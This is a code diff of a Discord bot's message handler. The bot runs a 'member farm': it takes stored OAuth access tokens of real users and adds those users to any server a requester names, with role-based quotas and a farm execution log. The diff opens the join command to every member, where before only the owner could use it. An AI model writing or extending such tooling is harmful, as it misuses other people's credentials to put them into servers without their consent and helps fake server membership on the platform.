@@ -282,124 +282,113 @@ client.on('guildMemberAdd', member => {
 });
 
 client.on('messageCreate', async message => {
-    const rawContent = message.content.trim();
-
-    if (message.channel.id === CHANNELS.AUTO_DELETE) {
-        setTimeout(async () => {
-            try { if (message.deletable) await message.delete(); } catch (err) {}
-        }, 7000);
-    }
-
+    const rawContent = message.content ? message.content.trim() : '';
     if (message.author.bot) return;
-
     if (!rawContent.startsWith(currentPrefix)) return;
 
     const args = rawContent.slice(currentPrefix.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    if (message.author.id !== OWNER_ID && command !== 'join') {
-        return webhookClient.send({ content: 'Only the join command is available to regular members.' });
+    // Only allow the join command
+    if (command !== 'join') return;
+
+    const targetGuildId = args[0];
+    if (!targetGuildId) {
+        return webhookClient.send({ content: `Please provide a Server ID: \`${currentPrefix}join <server_id>\`` });
     }
 
-    if (command === 'join') {
-        const targetGuildId = args[0];
-        if (!targetGuildId) {
-            return webhookClient.send({ content: `Please provide a Server ID: \`${currentPrefix}join <server_id>\`` });
+    const dbData = readDB();
+    let tokensToUse = Object.values(dbData.users);
+    if (tokensToUse.length === 0) {
+        const outOfStockEmbed = new EmbedBuilder().setTitle('Out of Stock').setDescription(`No accounts available.`).setColor(EMBED_COLOR);
+        return webhookClient.send({ embeds: [outOfStockEmbed] });
+    }
+
+    const roleLimits = [
+        { id: '1564676932195455047', limit: 2 },   
+        { id: '1563467132107231253', limit: 3 },   
+        { id: '1563467152202137681', limit: 5 },   
+        { id: '1563467218212356118', limit: 7 },   
+        { id: '1563467378040504431', limit: 9 },   
+        { id: '1563467675236311100', limit: 12 },  
+        { id: '1563467259194908722', limit: 20 }   
+    ];
+
+    let allowedLimit = Infinity;
+    let userMaxQueue = 20; 
+    for (const tier of roleLimits) {
+        if (message.member.roles.cache.has(tier.id)) {
+            allowedLimit = tier.limit;
+            userMaxQueue = tier.limit;
+            break;
         }
+    }
 
-        const dbData = readDB();
-        let tokensToUse = Object.values(dbData.users);
-        if (tokensToUse.length === 0) {
-            const outOfStockEmbed = new EmbedBuilder().setTitle('Out of Stock').setDescription(`No accounts available.`).setColor(EMBED_COLOR);
-            return webhookClient.send({ embeds: [outOfStockEmbed] });
+    if (allowedLimit !== Infinity) {
+        const limit = Math.min(allowedLimit, tokensToUse.length);
+        tokensToUse = tokensToUse.slice(0, limit);
+    }
+
+    const verificationBotToken = process.env.VERIFICATION_BOT_TOKEN || process.env.DISCORD_TOKEN;
+
+    try {
+        const checkGuildRes = await getHttps(`https://discord.com/api/v10/users/@me/guilds`, {
+            'Authorization': `Bot ${verificationBotToken}`
+        });
+        const guildsList = checkGuildRes.data;
+        const isInServer = Array.isArray(guildsList) && guildsList.some(g => g.id === targetGuildId);
+
+        if (!isInServer) {
+            const errorEmbed = new EmbedBuilder()
+                .setTitle('Bot Error')
+                .setDescription(`The bot is not in this server yet. Please go to <#${CHANNELS.ADD_BOT}> and invite it to your server.\n\nOnce the bot has joined, try using the command again.`)
+                .setColor(EMBED_COLOR);
+            
+            return webhookClient.send({ embeds: [errorEmbed] });
         }
+    } catch (e) {
+        console.error('Failed to check guild membership:', e);
+    }
 
-        const roleLimits = [
-            { id: '1564676932195455047', limit: 2 },   
-            { id: '1563467132107231253', limit: 4 },   
-            { id: '1563467152202137681', limit: 6 },   
-            { id: '1563467218212356118', limit: 8 },   
-            { id: '1563467378040504431', limit: 10 },   
-            { id: '1563467675236311100', limit: 12 },  
-            { id: '1563467259194908722', limit: 20 }   
-        ];
+    if (pendingJoins.has(message.author.id)) {
+        clearTimeout(pendingJoins.get(message.author.id));
+        pendingJoins.delete(message.author.id);
+    }
 
-        let allowedLimit = Infinity;
-        let userMaxQueue = 20; 
-        for (const tier of roleLimits) {
-            if (message.member.roles.cache.has(tier.id)) {
-                allowedLimit = tier.limit;
-                userMaxQueue = tier.limit;
-                break;
-            }
-        }
+    const addingEmbed = new EmbedBuilder()
+        .setTitle('Adding Members')
+        .setDescription(`Total members to send: **${tokensToUse.length}**\nServer ID: **${targetGuildId}**\nYour queue position: **1/${userMaxQueue}**`)
+        .setColor(EMBED_COLOR);
+    
+    await webhookClient.send({ embeds: [addingEmbed] });
 
-        if (allowedLimit !== Infinity) {
-            const limit = Math.min(allowedLimit, tokensToUse.length);
-            tokensToUse = tokensToUse.slice(0, limit);
-        }
-
-        const verificationBotToken = process.env.VERIFICATION_BOT_TOKEN || process.env.DISCORD_TOKEN;
-
+    let successCount = 0;
+    for (const tokenData of tokensToUse) {
         try {
-            const checkGuildRes = await getHttps(`https://discord.com/api/v10/users/@me/guilds`, {
-                'Authorization': `Bot ${verificationBotToken}`
+            const joinRes = await postHttps(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, JSON.stringify({ access_token: tokenData.access_token }), {
+                'Authorization': `Bot ${verificationBotToken}`,
+                'Content-Type': 'application/json'
             });
-            const guildsList = checkGuildRes.data;
-            const isInServer = Array.isArray(guildsList) && guildsList.some(g => g.id === targetGuildId);
 
-            if (!isInServer) {
-                const errorEmbed = new EmbedBuilder()
-                    .setTitle('Bot Error')
-                    .setDescription(`The bot is not in this server yet. Please go to <#${CHANNELS.ADD_BOT}> and invite it to your server.\n\nOnce the bot has joined, try using the command again.`)
-                    .setColor(EMBED_COLOR);
-                
-                return webhookClient.send({ embeds: [errorEmbed] });
+            if (joinRes.status >= 200 && joinRes.status < 300) {
+                successCount++;
             }
-        } catch (e) {
-            console.error('Failed to check guild membership:', e);
+        } catch (err) {
+            console.error('Failed to add user via Verification bot:', err);
         }
-
-        if (pendingJoins.has(message.author.id)) {
-            clearTimeout(pendingJoins.get(message.author.id));
-            pendingJoins.delete(message.author.id);
-        }
-
-        const addingEmbed = new EmbedBuilder()
-            .setTitle('Adding Members')
-            .setDescription(`Total members to send: **${tokensToUse.length}**\nServer ID: **${targetGuildId}**\nYour queue position: **1/${userMaxQueue}**`)
-            .setColor(EMBED_COLOR);
-        
-        await webhookClient.send({ embeds: [addingEmbed] });
-
-        let successCount = 0;
-        for (const tokenData of tokensToUse) {
-            try {
-                const joinRes = await postHttps(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, JSON.stringify({ access_token: tokenData.access_token }), {
-                    'Authorization': `Bot ${verificationBotToken}`,
-                    'Content-Type': 'application/json'
-                });
-
-                if (joinRes.status >= 200 && joinRes.status < 300) {
-                    successCount++;
-                }
-            } catch (err) {
-                console.error('Failed to add user via Verification bot:', err);
-            }
-        }
-
-        try {
-            let farmLogChannel = client.channels.cache.get(CHANNELS.FARM_LOG) || await client.channels.fetch(CHANNELS.FARM_LOG);
-            if (farmLogChannel) {
-                const farmEmbed = new EmbedBuilder()
-                    .setTitle('Farm Execution Log')
-                    .setDescription(`**Executed By:** <@${message.author.id}>\n**Adder Bot:** Verification\n**Target Server:** \`${targetGuildId}\`\n**Successfully Added:** \`${successCount}\` / \`${tokensToUse.length}\` accounts`)
-                    .setColor(EMBED_COLOR)
-                    .setTimestamp();
-                await farmLogChannel.send({ embeds: [farmEmbed] });
-            }
-        } catch (e) {}
     }
+
+    try {
+        let farmLogChannel = client.channels.cache.get(CHANNELS.FARM_LOG) || await client.channels.fetch(CHANNELS.FARM_LOG);
+        if (farmLogChannel) {
+            const farmEmbed = new EmbedBuilder()
+                .setTitle('Farm Execution Log')
+                .setDescription(`**Executed By:** <@${message.author.id}>\n**Adder Bot:** Verification\n**Target Server:** \`${targetGuildId}\`\n**Successfully Added:** \`${successCount}\` / \`${tokensToUse.length}\` accounts`)
+                .setColor(EMBED_COLOR)
+                .setTimestamp();
+            await farmLogChannel.send({ embeds: [farmEmbed] });
+        }
+    } catch (e) {}
 });
 
 client.login(process.env.DISCORD_TOKEN);
